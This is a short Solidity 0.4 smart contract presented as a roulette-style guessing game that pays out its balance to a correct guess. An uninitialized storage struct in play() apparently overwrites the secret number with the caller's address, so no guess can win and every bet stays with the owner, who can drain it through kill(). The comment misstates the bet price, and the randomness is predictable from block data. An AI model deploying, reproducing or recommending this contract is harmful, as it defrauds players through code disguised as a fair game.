1 pragma solidity ^0.4.19;
2 
3 // BigBallerRoulette: Go big or go home
4 // 
5 // Guess the number secretly stored in the blockchain and win the whole contract balance.
6 // A new number is randomly chosen after each try.
7 //
8 // To play, call the play() method with the guessed number (1-10). Big balls edition: Bet price: 0.5 ether
9 
10 contract BigBallerRoulette {
11 
12     uint256 private secretNumber;
13     uint256 public lastPlayed;
14     uint256 public betPrice = 1 ether;
15     address public ownerAddr;
16 
17     struct Game {
18         address player;
19         uint256 number;
20     }
21     Game[] public gamesPlayed;
22 
23     function BigBallerRoulette() public {
24         ownerAddr = msg.sender;
25         shuffle();
26     }
27 
28     function shuffle() internal {
29         // randomly set secretNumber with a value between 1 and 10
30         secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 10 + 1;
31     }
32 
33     function play(uint256 number) payable public {
34         require(msg.value >= betPrice && number <= 10);
35 
36         Game game;
37         game.player = msg.sender;
38         game.number = number;
39         gamesPlayed.push(game);
40 
41         if (number == secretNumber) {
42             // win!
43             msg.sender.transfer(this.balance);
44         }
45 
46         shuffle();
47         lastPlayed = now;
48     }
49 
50     function kill() public {
51         if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
52             suicide(msg.sender);
53         }
54     }
55 
56     function() public payable { }
57 }